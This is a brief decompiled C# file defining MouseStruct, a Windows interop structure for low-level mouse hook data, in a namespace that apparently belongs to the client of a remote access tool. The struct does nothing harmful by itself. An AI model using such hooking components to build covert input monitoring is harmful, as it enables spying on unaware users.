using System;
using System.Runtime.InteropServices;

namespace xClient.Core.MouseKeyHook.WinApi
{
	// Token: 0x0200007E RID: 126
	[StructLayout(LayoutKind.Explicit)]
	internal struct MouseStruct
	{
		// Token: 0x04000179 RID: 377
		[FieldOffset(0)]
		public Point Point;

		// Token: 0x0400017A RID: 378
		[FieldOffset(10)]
		public short MouseData;

		// Token: 0x0400017B RID: 379
		[FieldOffset(16)]
		public int Timestamp;
	}
}
